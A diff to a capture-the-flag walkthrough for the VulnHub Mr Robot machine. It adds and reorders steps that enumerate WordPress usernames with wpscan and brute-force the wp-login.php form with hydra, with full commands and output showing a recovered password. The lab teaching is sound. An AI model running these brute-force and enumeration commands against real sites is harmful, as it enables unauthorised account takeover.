@@ -1350,17 +1350,15 @@ As we can see we have created a file with only 10 lines!, this means these 10 li
 <p></p>
 Now that we have setup our .dic file for bruteforcing we will return to it after completing our exploration of our enumerated files and directories. The last page we are going to look at is the /0/ directory.
 <p></p>
-Navigating to /0/ we are presented with a users blog.
+Navigating to /0/ we are presented with a users word press blog.
 <p></p>
 <div align="center">
-<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/e1f87870686d3884514f2093ca35c0fe199e561e/Starting_Point/VulnHub/MrRobot/images/userandpass.png"><br>
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/d1bd5e25f9f192517ffa91e1c9efdd13d5713e8f/Starting_Point/VulnHub/MrRobot/images/blog.png"><br>
 </div>
 <p></p>
-
-
-
-
-
+This is a very good find as we can use it to enumerate usernames using a program called wpscan, we will come back to this later.
+<p></p>
+To start with we are going to learn how to manually enumerate usernames using the login page we found previously.
 <p></p>
 We will start by looking at what returns we get when we submit text through the login box, we will enter 'test' in both the username and password box and see what we get.
 <p></p>
@@ -1569,67 +1567,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-09 11:57:
 [STATUS] 786.67 tries/min, 9440 tries in 00:12h, 2012 to do in 00:03h, 40 active
 1 of 1 target successfully completed, 3 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-09 12:12:15
-
 ```
 
 <p></p>
-We can see we got 3 positive returns from our username enumeration, we can now use this username to bruteforce the password of the login. I will show below how to do this using both hydra and wpscan.
+We can see we got 3 positive returns from our username enumeration, we can now use this username to bruteforce the password of the login. 
 <p></p>
-To use hydra we need to find out what the 'fail condition' is for hydra. To do this we will put the username 'elliot' in the login form and the password test.
+Manual enumeration of the user name using the login page took a fair bit of work, however it taught us the basics of hydra and burp. We will use hydra again to brute force the password but for now we will go through user enumeration using that blog page we found at /0/.
 <p></p>
-<div align="center">
-<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/cb1c0d66bff183e58ad747b866010d7b2fe40857/Starting_Point/VulnHub/MrRobot/images/wpusername.png"><br>
-</div>
-<p></p>
-You can see that this returned "The password you entered for the username elliot is incorrect." this will be our fail condition, so the command we will use looks like this:
-<p></p>
-
-```
-hydra -l elliot -P single.dic 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 40
-```
-
-<p></p>
-You can see with this command i have changed the username flag  to lowercase <kbd>-l</kbd> telling hydra to only use this username, the password flag has also changed to a capital <kbd>-P</kbd> directing it to a file. and the final change is to the fail condition at the end of the command telling it to look for 'is incorrect'
-<p></p>
-You can also see that I used the single.dic file this time to brute force, I will show the difference in time between using this file and the uniq.dic file.
-<p></p>
-The output we get for the single.dic is:
-<p></p>
-
-```
-❯ hydra -l elliot -P single.dic 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 40
-Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-09 12:54:25
-[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
-[DATA] attacking http-post-form://192.168.125.132:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect
-[80][http-post-form] host: 192.168.125.132   login: elliot   password: ER28-0652
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-09 12:54:31
-```
-
-<p></p>
-and the return for the uniq.dic file is:
-<p></p>
-
-```
-❯ hydra -l elliot -P uniq.dic 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 40
-Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-09 12:57:01
-[DATA] max 40 tasks per 1 server, overall 40 tasks, 11452 login tries (l:1/p:11452), ~287 tries per task
-[DATA] attacking http-post-form://192.168.125.132:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect
-[STATUS] 1040.00 tries/min, 1040 tries in 00:01h, 10412 to do in 00:11h, 40 active
-[STATUS] 1026.67 tries/min, 3080 tries in 00:03h, 8372 to do in 00:09h, 40 active
-[80][http-post-form] host: 192.168.125.132   login: elliot   password: ER28-0652
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-09 13:03:48
-```
-
-<p></p>
-The time difference between these two dictionaries was nearly 7min so you can see how refining your dictionaries saves considerable time.
-<p></p>
-Next I will demonstrate using wpscan to bruteforce the login, the help page looks like this:
+To do the alternate method of user enumeration we are going to use wpscan. The wpscan help pageg looks like this:
 <p></p>
 
 ```
@@ -1732,6 +1677,165 @@ Usage: wpscan [options]
 [!] To see full list of options use --hh.
 ```
 
+<p></p>
+You should be able to see the <kbd>-e</kbd> flag for enumeration. we are going to use this agains the users blog to enumerate usernames. To do this the command looks like this:
+<p></p>
+
+```
+wpscan --url 192.168.125.132/0/ --wp-content-dir /0/ -e u1-10
+```
+
+<p></p>
+Looking at this command we first point wpscan to the url we wish to enumerate using the <kbd>--url</kbd> flag followed by the content directory using the <kbd>--wp-content-dir</kbd> flag and finally we tell wpscan to enumerate all users with an id between 1-10 using the <kbd>-u</kbd> flag. The output from this command looks like this:
+<p></p>
+
+```
+❯ wpscan --url 192.168.125.132/0/ --wp-content-dir /0/ -e u1-10
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://192.168.125.132/0/ [192.168.125.132]
+[+] Started: Sat Jul 10 08:45:13 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache
+ |  - X-Powered-By: PHP/5.5.29
+ |  - X-Mod-Pagespeed: 1.9.32.3-4523
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://192.168.125.132/xmlrpc.php
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+ | Confirmed By:
+ |  - Link Tag (Passive Detection), 30% confidence
+ |  - Direct Access (Aggressive Detection), 100% confidence
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://192.168.125.132/feed/, <generator>http://wordpress.org/?v=4.3.1</generator>
+ |  - http://192.168.125.132/comments/feed/, <generator>http://wordpress.org/?v=4.3.1</generator>
+
+[+] WordPress theme in use: twentyfifteen
+ | Location: http://192.168.125.132/0/themes/twentyfifteen/
+ | Last Updated: 2021-03-09T00:00:00.000Z
+ | [!] The version is out of date, the latest version is 2.9
+ | Style URL: http://192.168.125.132/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
+ | Style Name: Twenty Fifteen
+ | Style URI: https://wordpress.org/themes/twentyfifteen/
+ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://192.168.125.132/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] mich05654
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+
+[+] elliot
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sat Jul 10 08:45:37 2021
+[+] Requests Done: 55
+[+] Cached Requests: 11
+[+] Data Sent: 25.206 KB
+[+] Data Received: 362.247 KB
+[+] Memory used: 156.492 MB
+[+] Elapsed time: 00:00:23
+```
+
+<p></p>
+We can see that this command took 23 seconds to enumerate 2 users! This method is much quicker than the hydra method however will only work with wp sites.
+<p></p>
+Now that we have discovered the users for this site we will brute force the login page, I will show below how to do this using both hydra and wpscan.
+<p></p>
+To use hydra we need to find out what the 'fail condition' is for hydra. To do this we will put the username 'elliot' in the login form and the password test.
+<p></p>
+<div align="center">
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/cb1c0d66bff183e58ad747b866010d7b2fe40857/Starting_Point/VulnHub/MrRobot/images/wpusername.png"><br>
+</div>
+<p></p>
+You can see that this returned "The password you entered for the username elliot is incorrect." this will be our fail condition, so the command we will use looks like this:
+<p></p>
+
+```
+hydra -l elliot -P single.dic 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 40
+```
+
+<p></p>
+You can see with this command i have changed the username flag  to lowercase <kbd>-l</kbd> telling hydra to only use this username, the password flag has also changed to a capital <kbd>-P</kbd> directing it to a file. and the final change is to the fail condition at the end of the command telling it to look for 'is incorrect'
+<p></p>
+You can also see that I used the single.dic file this time to brute force, I will show the difference in time between using this file and the uniq.dic file.
+<p></p>
+The output we get for the single.dic is:
+<p></p>
+
+```
+❯ hydra -l elliot -P single.dic 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 40
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-09 12:54:25
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
+[DATA] attacking http-post-form://192.168.125.132:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect
+[80][http-post-form] host: 192.168.125.132   login: elliot   password: ER28-0652
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-09 12:54:31
+```
+
+<p></p>
+and the return for the uniq.dic file is:
+<p></p>
+
+```
+❯ hydra -l elliot -P uniq.dic 192.168.125.132 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 40
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-09 12:57:01
+[DATA] max 40 tasks per 1 server, overall 40 tasks, 11452 login tries (l:1/p:11452), ~287 tries per task
+[DATA] attacking http-post-form://192.168.125.132:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect
+[STATUS] 1040.00 tries/min, 1040 tries in 00:01h, 10412 to do in 00:11h, 40 active
+[STATUS] 1026.67 tries/min, 3080 tries in 00:03h, 8372 to do in 00:09h, 40 active
+[80][http-post-form] host: 192.168.125.132   login: elliot   password: ER28-0652
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-09 13:03:48
+```
+
+<p></p>
+The time difference between these two dictionaries was nearly 7min so you can see how refining your dictionaries saves considerable time.
+<p></p>
+Next I will demonstrate using wpscan to bruteforce the login, again we can only use this method because the page we are brute forcing is a wp site, hydra doesn't have this limitation:
 <p></p>
 The command we will use is fairly simple, it looks like this (we will use the uniq.dic to start):
 <p></p>
